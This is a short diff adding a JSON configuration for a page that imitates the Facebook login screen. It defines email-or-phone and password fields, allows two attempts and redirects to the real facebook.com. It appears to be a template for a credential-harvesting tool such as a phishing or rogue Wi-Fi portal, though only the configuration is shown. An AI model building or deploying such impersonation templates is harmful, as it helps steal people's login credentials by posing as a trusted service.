@@ -1,0 +1,20 @@
+{
+    "name": "facebook",
+    "display_name": "Facebook",
+    "description": "Facebook login page (2024/2025 design)",
+    "redirect_url": "https://www.facebook.com/",
+    "auth_flow": "single",
+    "max_attempts": 2,
+    "fields": [
+        {
+            "name": "email",
+            "display_name": "Email or Phone",
+            "field_type": "text"
+        },
+        {
+            "name": "pass",
+            "display_name": "Password",
+            "field_type": "password"
+        }
+    ]
+}
